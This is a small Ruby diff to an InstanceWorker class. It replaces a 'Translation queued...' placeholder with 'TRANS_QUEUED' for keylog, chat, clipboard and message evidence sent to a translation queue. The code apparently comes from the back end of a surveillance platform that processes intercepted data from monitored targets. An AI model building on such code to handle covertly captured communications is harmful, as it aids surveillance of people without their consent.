@@ -236,7 +236,7 @@ class InstanceWorker
     # add to the translation queue
     if $license['translation'] and ['keylog', 'chat', 'clipboard', 'message'].include? evidence.type
       TransQueue.add(@target._id, evidence._id)
-      evidence.data[:tr] = "Translation queued..."
+      evidence.data[:tr] = "TRANS_QUEUED"
       evidence.save
     end
 
